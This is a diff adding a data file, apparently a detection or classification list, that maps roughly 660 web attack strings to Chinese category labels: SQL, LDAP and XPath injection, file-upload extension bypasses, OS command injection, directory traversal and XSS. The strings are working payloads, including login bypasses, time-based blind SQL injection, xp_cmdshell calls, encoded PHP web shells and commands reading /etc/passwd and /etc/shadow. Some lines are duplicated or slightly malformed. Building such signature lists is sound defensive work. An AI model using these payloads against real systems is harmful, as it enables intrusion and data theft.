@@ -1,0 +1,660 @@
+@variable : SQL注入攻击
+,@variable : SQL注入攻击
+PRINT : SQL注入攻击
+PRINT @@variable : SQL注入攻击
+from : SQL注入攻击
+insert : SQL注入攻击
+procedure : SQL注入攻击
+limit : SQL注入攻击
+order by : SQL注入攻击
+asc : SQL注入攻击
+desc : SQL注入攻击
+delete : SQL注入攻击
+update : SQL注入攻击
+distinct : SQL注入攻击
+having : SQL注入攻击
+truncate : SQL注入攻击
+handler : SQL注入攻击
+bfilename : SQL注入攻击
+union : SQL注入攻击
+'%20-- : SQL注入攻击
+--'; : SQL注入攻击
+'%20; : SQL注入攻击
+=%20' : SQL注入攻击
+=%20; : SQL注入攻击
+=%20-- : SQL注入攻击
+'or%20select * : SQL注入攻击
+admin'-- : SQL注入攻击
+<>"'%;)(&+ : SQL注入攻击
+'%20or%20''=' : SQL注入攻击
+'%20or%20'x'='x : SQL注入攻击
+"%20or%20"x"="x : SQL注入攻击
+')%20or%20('x'='x : SQL注入攻击
+0 or 1=1 : SQL注入攻击
+' or 0=0 -- : SQL注入攻击
+" or 0=0 -- : SQL注入攻击
+or 0=0 -- : SQL注入攻击
+' or 0=0 # : SQL注入攻击
+" or 0=0 # : SQL注入攻击
+or 0=0 # : SQL注入攻击
+' or 1=1-- : SQL注入攻击
+" or 1=1-- : SQL注入攻击
+' or '1'='1'-- : SQL注入攻击
+"' or 1 --'" : SQL注入攻击
+or 1=1-- : SQL注入攻击
+or%201=1 : SQL注入攻击
+or%201=1 -- : SQL注入攻击
+' or 1=1 or ''=' : SQL注入攻击
+" or 1=1 or ""=" : SQL注入攻击
+' or a=a-- : SQL注入攻击
+" or "a"="a : SQL注入攻击
+') or ('a'='a : SQL注入攻击
+") or ("a"="a : SQL注入攻击
+hi" or "a"="a : SQL注入攻击
+hi" or 1=1 -- : SQL注入攻击
+hi' or 1=1 -- : SQL注入攻击
+hi' or 'a'='a : SQL注入攻击
+hi') or ('a'='a : SQL注入攻击
+hi") or ("a"="a : SQL注入攻击
+'hi' or 'x'='x'; : SQL注入攻击
+' or username like '% : SQL注入攻击
+' or uname like '% : SQL注入攻击
+' or userid like '% : SQL注入攻击
+' or uid like '% : SQL注入攻击
+' or user like '% : SQL注入攻击
+exec xp : SQL注入攻击
+exec sp : SQL注入攻击
+'; exec master..xp_cmdshell : SQL注入攻击
+'; exec xp_regread : SQL注入攻击
+t'exec master..xp_cmdshell 'nslookup www.google.com'-- : SQL注入攻击
+--sp_password : SQL注入攻击
+' UNION SELECT : SQL注入攻击
+' UNION ALL SELECT : SQL注入攻击
+' or (EXISTS) : SQL注入攻击
+' (select top 1 : SQL注入攻击
+'||UTL_HTTP.REQUEST : SQL注入攻击
+1;SELECT%20\* : SQL注入攻击
+to_timestamp_tz : SQL注入攻击
+tz_offset : SQL注入攻击
+&lt;&gt;&quot;'%;)(&amp;+ : SQL注入攻击
+'%20or%201=1 : SQL注入攻击
+%27%20or%201=1 : SQL注入攻击
+%20$(sleep%2050) : SQL注入攻击
+%20'sleep%2050' : SQL注入攻击
+char%4039%41%2b%40SELECT : SQL注入攻击
+&apos;%20OR : SQL注入攻击
+'sqlattempt1 : SQL注入攻击
+(sqlattempt2) : SQL注入攻击
+*(|(mail=*)) : SQL注入攻击
+%2A%28%7C%28mail%3D%2A%29%29 : SQL注入攻击
+*(|(objectclass=*)) : SQL注入攻击
+%2A%28%7C%28objectclass%3D%2A%29%29 : SQL注入攻击
+' or 1=1 or ''=' : SQL注入攻击
+' or ''=' : SQL注入攻击
+x' or 1=1 or 'x'='y : SQL注入攻击
+ union select  : SQL注入攻击
++union+select+ : SQL注入攻击
+/**/union/**/select/**/ : SQL注入攻击
+/**/UNunionION/**/SELselectECT/**/ : SQL注入攻击
+/**//*UnIOn*//**//*SEleCt*//**/ : SQL注入攻击
+/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL注入攻击
+ union all select  : SQL注入攻击
++union+all+select+ : SQL注入攻击
+/**/union/**/all/**/select/**/ : SQL注入攻击
+/**/UNunionION/**/all/**/SELselectECT/**/ : SQL注入攻击
+/**//*UnIOn*//**/all/**//*SEleCt*//**/ : SQL注入攻击
+/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL注入攻击
+ waitfor delay '0:0:10'-- : SQL注入攻击
++waitfor+delay+'0:0:10'-- : SQL注入攻击
+/**/waitfor/**/delay/**/'0:0:10'-- : SQL注入攻击
+%20waitfor%20delay%20'0:0:20'-- : SQL注入攻击
+ waitfor delay '0:0:10'/* : SQL注入攻击
++waitfor+delay+'0:0:10'/* : SQL注入攻击
+/**/waitfor/**/delay/**/'0:0:10'/* : SQL注入攻击
+%20waitfor%20delay%20'0:0:20'/* : SQL注入攻击
+'  waitfor delay '0:0:10'--+ : SQL注入攻击
+'+waitfor+delay+'0:0:10'--+ : SQL注入攻击
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL注入攻击
+'%20waitfor%20delay%20'0:0:20'--+ : SQL注入攻击
+ and 0=benchmark(3000000,MD5(1))-- : SQL注入攻击
++and+0=benchmark(3000000,MD5(1))+-- : SQL注入攻击
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL注入攻击
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL注入攻击
+ and 0=benchmark(3000000,MD5(1))/* : SQL注入攻击
++and+0=benchmark(3000000,MD5(1))+/* : SQL注入攻击
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL注入攻击
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL注入攻击
+' and 0=benchmark(3000000,MD5(1))--+ : SQL注入攻击
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL注入攻击
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL注入攻击
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL注入攻击
+sleep(__TIME__)# : SQL注入攻击
+1 or sleep(__TIME__)# : SQL注入攻击
+" or sleep(__TIME__)# : SQL注入攻击
+' or sleep(__TIME__)# : SQL注入攻击
+" or sleep(__TIME__)=" : SQL注入攻击
+' or sleep(__TIME__)=' : SQL注入攻击
+1) or sleep(__TIME__)# : SQL注入攻击
+") or sleep(__TIME__)=" : SQL注入攻击
+') or sleep(__TIME__)=' : SQL注入攻击
+1)) or sleep(__TIME__)# : SQL注入攻击
+")) or sleep(__TIME__)=" : SQL注入攻击
+')) or sleep(__TIME__)=' : SQL注入攻击
+pg_sleep(__TIME__)-- : SQL注入攻击
+1 or pg_sleep(__TIME__)-- : SQL注入攻击
+" or pg_sleep(__TIME__)-- : SQL注入攻击
+' or pg_sleep(__TIME__)-- : SQL注入攻击
+1) or pg_sleep(__TIME__)-- : SQL注入攻击
+") or pg_sleep(__TIME__)-- : SQL注入攻击
+') or pg_sleep(__TIME__)-- : SQL注入攻击
+1)) or pg_sleep(__TIME__)-- : SQL注入攻击
+")) or pg_sleep(__TIME__)-- : SQL注入攻击
+')) or pg_sleep(__TIME__)-- : SQL注入攻击
+<?system('id');?> : SQL注入攻击
+<?system('uname -a');?> : SQL注入攻击
+<?php phpinfo(); ?> : SQL注入攻击
+<? system($_GET['c']); ?> : SQL注入攻击
+0x3c3f2073797374656d28245f4745545b2763275d293b203f3e : SQL注入攻击
+PD8gc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== : SQL注入攻击
+%3C%3F%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E : SQL注入攻击
+char(60,63,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,39,93,41,59,32,63,62) : SQL注入攻击
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL注入攻击
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL注入攻击
+data:;base64,<? exec($_GET[cmd]); ?>&cmd=whoami : SQL注入攻击
+ and 1=1-- : SQL注入攻击
+ and 1=2-- : SQL注入攻击
+ and 5050=5050-- : SQL注入攻击
+ and 5050=5051-- : SQL注入攻击
+ and substring(@@version,1,1)=4-- : SQL注入攻击
+ and substring(@@version,1,1)=5-- : SQL注入攻击
+ and ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>-- : SQL注入攻击
+ and (SELECT 1 from admin limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from tblAdmin limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from Administrator limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from tbl_admin limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from user limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from users limit 0,1)=1-- : SQL注入攻击
+ and (SELECT 1 from TableName limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,name),1,1) from tblAdmin limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1-- : SQL注入攻击
+ and (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1-- : SQL注入攻击
+ and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65-- : SQL注入攻击
+ and 1=1 : SQL注入攻击
+ and 1=2 : SQL注入攻击
+ and 1>2 : SQL注入攻击
+ and 1<=2 : SQL注入攻击
++and+1=1 : SQL注入攻击
++and+1=2 : SQL注入攻击
++and+1>2 : SQL注入攻击
++and+1<=2 : SQL注入攻击
+/**/and/**/1=1 : SQL注入攻击
+/**/and/**/1=2 : SQL注入攻击
+/**/and/**/1>2 : SQL注入攻击
+/**/and/**/1<=2 : SQL注入攻击
+/**/or/**/1/**/=/**/1 : SQL注入攻击
+/**/or/**/1/**/=/**/2 : SQL注入攻击
+/**/or/**/1/**/>/**/2 : SQL注入攻击
+/**/or/**/1/**/<=/**/2 : SQL注入攻击
+ and 50=50 : SQL注入攻击
+ and 50=52 : SQL注入攻击
+ and 50>52 : SQL注入攻击
+ and 50<=52 : SQL注入攻击
++and+50=50 : SQL注入攻击
++and+50=52 : SQL注入攻击
++and+50>52 : SQL注入攻击
++and+50<=52 : SQL注入攻击
+/**/and/**/50=50 : SQL注入攻击
+/**/and/**/50=52 : SQL注入攻击
+/**/and/**/50>52 : SQL注入攻击
+/**/and/**/50<=52 : SQL注入攻击
+/**/or/**/51/**/=/**/51 : SQL注入攻击
+/**/or/**/51/**/=/**/52 : SQL注入攻击
+/**/or/**/51/**/>/**/52 : SQL注入攻击
+/**/or/**/51/**/<=/**/52 : SQL注入攻击
+ waitfor delay '0:0:10'-- : SQL注入攻击
+; waitfor delay '0:0:10'-- : SQL注入攻击
++waitfor+delay+'0:0:10'-- : SQL注入攻击
+/**/waitfor/**/delay/**/'0:0:10'- : SQL注入攻击-
+%20waitfor%20delay%20'0:0:20'-- : SQL注入攻击
+ waitfor delay '0:0:10'-- : SQL注入攻击
+; waitfor delay '0:0:10'-- : SQL注入攻击
++waitfor+delay+'0:0:10'/* : SQL注入攻击
+/**/waitfor/**/delay/**/'0:0:10'/\ : SQL注入攻击*
+%20waitfor%20delay%20'0:0:20'/* : SQL注入攻击
+'  waitfor delay '0:0:10'--+ : SQL注入攻击
+'+waitfor+delay+'0:0:10'--+ : SQL注入攻击
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL注入攻击
+'%20waitfor%20delay%20'0:0:20'--+ : SQL注入攻击
+ and 0=benchmark(3000000,MD5(1))-- : SQL注入攻击
++and+0=benchmark(3000000,MD5(1))+-- : SQL注入攻击
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL注入攻击
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL注入攻击
+; and 0=benchmark(3000000,MD5(1))/* : SQL注入攻击
+ and 0=benchmark(3000000,MD5(1))/* : SQL注入攻击
++and+0=benchmark(3000000,MD5(1))+/* : SQL注入攻击
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL注入攻击
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL注入攻击
+' and 0=benchmark(3000000,MD5(1))--+ : SQL注入攻击
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL注入攻击
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL注入攻击
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL注入攻击
+sleep(__TIME__)# : SQL注入攻击
+1 or sleep(__TIME__)# : SQL注入攻击
+" or sleep(__TIME__)# : SQL注入攻击
+' or sleep(__TIME__)# : SQL注入攻击
+" or sleep(__TIME__)=" : SQL注入攻击
+' or sleep(__TIME__)=' : SQL注入攻击
+1) or sleep(__TIME__)# : SQL注入攻击
+") or sleep(__TIME__)=" : SQL注入攻击
+') or sleep(__TIME__)=' : SQL注入攻击
+1)) or sleep(__TIME__)# : SQL注入攻击
+")) or sleep(__TIME__)=" : SQL注入攻击
+')) or sleep(__TIME__)=' : SQL注入攻击
+pg_sleep(__TIME__)-- : SQL注入攻击
+1 or pg_sleep(__TIME__)-- : SQL注入攻击
+" or pg_sleep(__TIME__)-- : SQL注入攻击
+' or pg_sleep(__TIME__)-- : SQL注入攻击
+1) or pg_sleep(__TIME__)-- : SQL注入攻击
+") or pg_sleep(__TIME__)-- : SQL注入攻击
+') or pg_sleep(__TIME__)-- : SQL注入攻击
+1)) or pg_sleep(__TIME__)-- : SQL注入攻击
+")) or pg_sleep(__TIME__)-- : SQL注入攻击
+')) or pg_sleep(__TIME__)-- : SQL注入攻击
+%2A%28%7C%28mail%3D%2A%29%29 : LDAP注入攻击
+%2A%28%7C%28objectclass%3D%2A%29%29 : LDAP注入攻击
+%2A%7C : LDAP注入攻击
+*(|(mail=*)) : LDAP注入攻击
+*(|(objectclass=*)) : LDAP注入攻击
+x' or name()='username' or 'x'='y : LDAP注入攻击
+*()|&' : LDAP注入攻击
+admin\* : LDAP注入攻击
+admin*)((|userpassword=*) : LDAP注入攻击
+*)(uid=*))(|(uid=* : LDAP注入攻击
+*()|%26' : LDAP注入攻击
+phtml : 恶意文件上传攻击
+php3 : 恶意文件上传攻击
+php4 : 恶意文件上传攻击
+php5 : 恶意文件上传攻击
+pHtml : 恶意文件上传攻击
+pHp3 : 恶意文件上传攻击
+pHp4 : 恶意文件上传攻击
+pHp5 : 恶意文件上传攻击
+asa : 恶意文件上传攻击
+iNc%00 : 恶意文件上传攻击
+iNc%20%20%20 : 恶意文件上传攻击
+iNc%20%20%20...%20.%20.. : 恶意文件上传攻击
+iNc...... : 恶意文件上传攻击
+inc%00 : 恶意文件上传攻击
+inc%20%20%20 : 恶意文件上传攻击
+inc%20%20%20...%20.%20.. : 恶意文件上传攻击
+inc...... : 恶意文件上传攻击
+pHp%00 : 恶意文件上传攻击
+pHp%20%20%20 : 恶意文件上传攻击
+pHp%20%20%20...%20.%20.. : 恶意文件上传攻击
+pHp...... : 恶意文件上传攻击
+pHp3%00 : 恶意文件上传攻击
+pHp3%20%20%20 : 恶意文件上传攻击
+pHp3%20%20%20...%20.%20.. : 恶意文件上传攻击
+pHp3...... : 恶意文件上传攻击
+pHp4%00 : 恶意文件上传攻击
+pHp4%20%20%20 : 恶意文件上传攻击
+pHp4%20%20%20...%20.%20.. : 恶意文件上传攻击
+pHp4...... : 恶意文件上传攻击
+pHp5%00 : 恶意文件上传攻击
+pHp5%20%20%20 : 恶意文件上传攻击
+pHp5%20%20%20...%20.%20.. : 恶意文件上传攻击
+pHp5...... : 恶意文件上传攻击
+pHtml%00 : 恶意文件上传攻击
+pHtml%20%20%20 : 恶意文件上传攻击
+pHtml%20%20%20...%20.%20.. : 恶意文件上传攻击
+pHtml...... : 恶意文件上传攻击
+php%00 : 恶意文件上传攻击
+php%20%20%20 : 恶意文件上传攻击
+php%20%20%20...%20.%20.. : 恶意文件上传攻击
+php...... : 恶意文件上传攻击
+php3%00 : 恶意文件上传攻击
+php3%20%20%20 : 恶意文件上传攻击
+php3%20%20%20...%20.%20.. : 恶意文件上传攻击
+php3...... : 恶意文件上传攻击
+php4%00 : 恶意文件上传攻击
+php4%20%20%20 : 恶意文件上传攻击
+php4%20%20%20...%20.%20.. : 恶意文件上传攻击
+php4...... : 恶意文件上传攻击
+php5%00 : 恶意文件上传攻击
+php5%20%20%20 : 恶意文件上传攻击
+php5%20%20%20...%20.%20.. : 恶意文件上传攻击
+php5...... : 恶意文件上传攻击
+phtml%00 : 恶意文件上传攻击
+phtml%20%20%20 : 恶意文件上传攻击
+phtml%20%20%20...%20.%20.. : 恶意文件上传攻击
+phtml...... : 恶意文件上传攻击
+asp%20%20%20 : 恶意文件上传攻击
+aspx%20%20%20 : 恶意文件上传攻击
+asa%20%20%20 : 恶意文件上传攻击
+aSP%20%20%20 : 恶意文件上传攻击
+aSpx%20%20%20 : 恶意文件上传攻击
+aSa%20%20%20 : 恶意文件上传攻击
+asp...... : 恶意文件上传攻击
+aspx...... : 恶意文件上传攻击
+asa...... : 恶意文件上传攻击
+aSP...... : 恶意文件上传攻击
+aSpx...... : 恶意文件上传攻击
+aSa...... : 恶意文件上传攻击
+asp%20%20%20...%20.%20.. : 恶意文件上传攻击
+aspx%20%20%20...%20.%20.. : 恶意文件上传攻击
+asa%20%20%20...%20.%20.. : 恶意文件上传攻击
+aSP%20%20%20...%20.%20.. : 恶意文件上传攻击
+aSpx%20%20%20...%20.%20.. : 恶意文件上传攻击
+aSa%20%20%20...%20.%20.. : 恶意文件上传攻击
+asp%00 : 恶意文件上传攻击
+aspx%00 : 恶意文件上传攻击
+asa%00 : 恶意文件上传攻击
+aSp%00 : 恶意文件上传攻击
+aSpx%00 : 恶意文件上传攻击
+aSa%00 : 恶意文件上传攻击
+cfm : 恶意文件上传攻击
+cfml : 恶意文件上传攻击
+cfc : 恶意文件上传攻击
+dbm : 恶意文件上传攻击
+cFm : 恶意文件上传攻击
+cFml : 恶意文件上传攻击
+cFc : 恶意文件上传攻击
+dBm : 恶意文件上传攻击
+cfm%20%20%20 : 恶意文件上传攻击
+cfml%20%20%20 : 恶意文件上传攻击
+cfc%20%20%20 : 恶意文件上传攻击
+dbm%20%20%20 : 恶意文件上传攻击
+cFm%20%20%20 : 恶意文件上传攻击
+cFml%20%20%20 : 恶意文件上传攻击
+cFc%20%20%20 : 恶意文件上传攻击
+dBm%20%20%20 : 恶意文件上传攻击
+cfm...... : 恶意文件上传攻击
+cfml...... : 恶意文件上传攻击
+cfc....... : 恶意文件上传攻击
+dbm...... : 恶意文件上传攻击
+cFm...... : 恶意文件上传攻击
+cFml...... : 恶意文件上传攻击
+cFc...... : 恶意文件上传攻击
+dBm...... : 恶意文件上传攻击
+cfm%20%20%20...%20.%20.. : 恶意文件上传攻击
+cfml%20%20%20...%20.%20.. : 恶意文件上传攻击
+cfc%20%20%20...%20.%20.. : 恶意文件上传攻击
+dbm%20%20%20...%20.%20.. : 恶意文件上传攻击
+cFm%20%20%20...%20.%20.. : 恶意文件上传攻击
+cFml%20%20%20...%20.%20.. : 恶意文件上传攻击
+cFc%20%20%20...%20.%20.. : 恶意文件上传攻击
+dBm%20%20%20...%20.%20.. : 恶意文件上传攻击
+cfm%00 : 恶意文件上传攻击
+cfml%00 : 恶意文件上传攻击
+cfc%00 : 恶意文件上传攻击
+dbm%00 : 恶意文件上传攻击
+cFm%00 : 恶意文件上传攻击
+cFml%00 : 恶意文件上传攻击
+cFc%00 : 恶意文件上传攻击
+dBm%00 : 恶意文件上传攻击
+jspx : 恶意文件上传攻击
+jsw : 恶意文件上传攻击
+jsv : 恶意文件上传攻击
+jspf : 恶意文件上传攻击
+jSpx : 恶意文件上传攻击
+jSw : 恶意文件上传攻击
+jSv : 恶意文件上传攻击
+jSpf : 恶意文件上传攻击
+jSp%00 : 恶意文件上传攻击
+jSp%20%20%20 : 恶意文件上传攻击
+jSp%20%20%20...%20.%20..a : 恶意文件上传攻击
+jSp...... : 恶意文件上传攻击
+jSpf%00 : 恶意文件上传攻击
+jSpf%20%20%20 : 恶意文件上传攻击
+jSpf%20%20%20...%20.%20..a : 恶意文件上传攻击
+jSpf...... : 恶意文件上传攻击
+jSpx%00 : 恶意文件上传攻击
+jSpx%20%20%20 : 恶意文件上传攻击
+jSpx%20%20%20...%20.%20..a : 恶意文件上传攻击
+jSpx...... : 恶意文件上传攻击
+jSv%00 : 恶意文件上传攻击
+jSv%20%20%20 : 恶意文件上传攻击
+jSv%20%20%20...%20.%20..a : 恶意文件上传攻击
+jSv...... : 恶意文件上传攻击
+jSw%00 : 恶意文件上传攻击
+jSw%20%20%20 : 恶意文件上传攻击
+jSw%20%20%20...%20.%20..a : 恶意文件上传攻击
+jSw...... : 恶意文件上传攻击
+jsp%00 : 恶意文件上传攻击
+jsp%20%20%20 : 恶意文件上传攻击
+jsp%20%20%20...%20.%20..a : 恶意文件上传攻击
+jsp...... : 恶意文件上传攻击
+jspf%00 : 恶意文件上传攻击
+jspf%20%20%20 : 恶意文件上传攻击
+jspf%20%20%20...%20.%20..a : 恶意文件上传攻击
+jspf...... : 恶意文件上传攻击
+jspx%00 : 恶意文件上传攻击
+jspx%20%20%20 : 恶意文件上传攻击
+jspx%20%20%20...%20.%20..a : 恶意文件上传攻击
+jspx...... : 恶意文件上传攻击
+jsv%00 : 恶意文件上传攻击
+jsv%20%20%20 : 恶意文件上传攻击
+jsv%20%20%20...%20.%20..a : 恶意文件上传攻击
+jsv...... : 恶意文件上传攻击
+jsw%00 : 恶意文件上传攻击
+jsw%20%20%20 : 恶意文件上传攻击
+jsw%20%20%20...%20.%20..a : 恶意文件上传攻击
+jsw...... : 恶意文件上传攻击
+' or '1'='1 : Xpath注入攻击
+' or ''=' : Xpath注入攻击
+x' or 1=1 or 'x'='y : Xpath注入攻击
+count(/child::node()) : Xpath注入攻击
+x' or name()='username' or 'x'='y : Xpath注入攻击
+' and count(/*)=1 and '1'='1 : Xpath注入攻击
+' and count(/@*)=1 and '1'='1 : Xpath注入攻击
+' and count(/comment())=1 and '1'='1 : Xpath注入攻击
+uname -n -s : OS命令注入攻击
+whoami|pwd : OS命令注入攻击
+cat /etc/passwd : OS命令注入攻击
+ls -la /tmp : OS命令注入攻击
+ls -la /home : OS命令注入攻击
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; : OS命令注入攻击
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; : OS命令注入攻击
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : OS命令注入攻击
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : OS命令注入攻击
+/index.html|id| : OS命令注入攻击
+;id; : OS命令注入攻击
+;id : OS命令注入攻击
+;netstat -a; : OS命令注入攻击
+;id; : OS命令注入攻击
+|id : OS命令注入攻击
+|/usr/bin/id : OS命令注入攻击
+|id| : OS命令注入攻击
+|/usr/bin/id| : OS命令注入攻击
+||/usr/bin/id| : OS命令注入攻击
+|id; : OS命令注入攻击
+||/usr/bin/id; : OS命令注入攻击
+;id| : OS命令注入攻击
+;|/usr/bin/id| : OS命令注入攻击
+\n/bin/ls -al\n : OS命令注入攻击
+\n/usr/bin/id\n : OS命令注入攻击
+\nid\n : OS命令注入攻击
+\n/usr/bin/id; : OS命令注入攻击
+\nid; : OS命令注入攻击
+\n/usr/bin/id| : OS命令注入攻击
+\nid| : OS命令注入攻击
+;/usr/bin/id\n : OS命令注入攻击
+;id\n : OS命令注入攻击
+|usr/bin/id\n : OS命令注入攻击
+|nid\n : OS命令注入攻击
+`id` : OS命令注入攻击
+`/usr/bin/id` : OS命令注入攻击
+a);id : OS命令注入攻击
+a;id : OS命令注入攻击
+a);id; : OS命令注入攻击
+a;id; : OS命令注入攻击
+a);id| : OS命令注入攻击
+a;id| : OS命令注入攻击
+a)|id : OS命令注入攻击
+a|id : OS命令注入攻击
+a)|id; : OS命令注入攻击
+a|id : OS命令注入攻击
+|/bin/ls -al : OS命令注入攻击
+a);/usr/bin/id : OS命令注入攻击
+a;/usr/bin/id : OS命令注入攻击
+a);/usr/bin/id; : OS命令注入攻击
+a;/usr/bin/id; : OS命令注入攻击
+a);/usr/bin/id| : OS命令注入攻击
+a;/usr/bin/id| : OS命令注入攻击
+a)|/usr/bin/id : OS命令注入攻击
+a|/usr/bin/id : OS命令注入攻击
+a)|/usr/bin/id; : OS命令注入攻击
+a|/usr/bin/id : OS命令注入攻击
+;system('cat%20/etc/passwd') : OS命令注入攻击
+;system('id') : OS命令注入攻击
+;system('/usr/bin/id') : OS命令注入攻击
+%0Acat%20/etc/passwd : OS命令注入攻击
+%0A/usr/bin/id : OS命令注入攻击
+%0Aid : OS命令注入攻击
+%0A/usr/bin/id%0A : OS命令注入攻击
+%0Aid%0A : OS命令注入攻击
+& ping -i 30 127.0.0.1 : OS命令注入攻击 &
+& ping -n 30 127.0.0.1 & : OS命令注入攻击
+%0a ping -i 30 127.0.0.1 %0a : OS命令注入攻击
+`ping 127.0.0.1` : OS命令注入攻击
+| id : OS命令注入攻击
+& id : OS命令注入攻击
+; id : OS命令注入攻击
+%0a id %0a : OS命令注入攻击
+`id` : OS命令注入攻击
+$;/usr/bin/id : OS命令注入攻击
+/etc/passwd : 目录遍历攻击
+/etc/shadow : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/etc/httpd/logs/acces_log  : 目录遍历攻击
+/etc/httpd/logs/acces.log  : 目录遍历攻击
+/etc/httpd/logs/error_log  : 目录遍历攻击
+/etc/httpd/logs/error.log  : 目录遍历攻击
+/var/www/logs/access_log  : 目录遍历攻击
+/var/www/logs/access.log  : 目录遍历攻击
+/usr/local/apache/logs/access_log  : 目录遍历攻击
+/usr/local/apache/logs/access.log  : 目录遍历攻击
+/var/log/apache/access_log  : 目录遍历攻击
+/var/log/apache2/access_log  : 目录遍历攻击
+/var/log/apache/access.log  : 目录遍历攻击
+/var/log/apache2/access.log  : 目录遍历攻击
+/var/log/access_log  : 目录遍历攻击
+/var/log/access.log  : 目录遍历攻击
+/var/www/logs/error_log  : 目录遍历攻击
+/var/www/logs/error.log  : 目录遍历攻击
+/usr/local/apache/logs/error_log  : 目录遍历攻击
+/usr/local/apache/logs/error.log  : 目录遍历攻击
+/var/log/apache/error_log  : 目录遍历攻击
+/var/log/apache2/error_log  : 目录遍历攻击
+/var/log/apache/error.log  : 目录遍历攻击
+/var/log/apache2/error.log  : 目录遍历攻击
+/var/log/error_log  : 目录遍历攻击
+/var/log/error.log  : 目录遍历攻击
+<script>alert('Zer0Lulz')</script> : XSS攻击
+<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+"><script>alert('XSS')</script> : XSS攻击
+"><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=><><script>alert('XSS')</script> : XSS攻击
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+="><script>alert('XSS')</script> : XSS攻击
+="><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+='><script>alert('XSS')</script> : XSS攻击
+='><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+="><<script>alert('XSS')</script> : XSS攻击
+="><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+='><<script>alert('XSS')</script> : XSS攻击
+='><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+"><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+"><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+="><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+="><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+='><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+='><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+="><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+="><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+='><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+='><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+"%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+"%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript>alert('XSS')%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt>AlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+="%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+="%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+='%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
